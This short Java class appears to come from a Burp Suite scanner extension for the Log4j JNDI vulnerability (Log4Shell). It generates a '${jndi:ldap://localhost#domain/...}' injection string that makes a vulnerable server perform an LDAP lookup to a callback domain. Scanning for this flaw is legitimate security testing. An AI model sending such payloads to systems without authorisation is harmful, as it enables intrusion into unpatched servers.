package burp.poc.impl;

import burp.poc.IPOC;
import burp.utils.Utils;

public class POC13 implements IPOC {
    @Override
    public String generate(String domain) {
        return "${jndi:ldap://localhost#" + domain + "/" + Utils.GetRandomString(Utils.GetRandomNumber(2, 5)) + "}";
    }

    @Override
    public int getType() {
        return POC_TYPE_LDAP;
    }
}
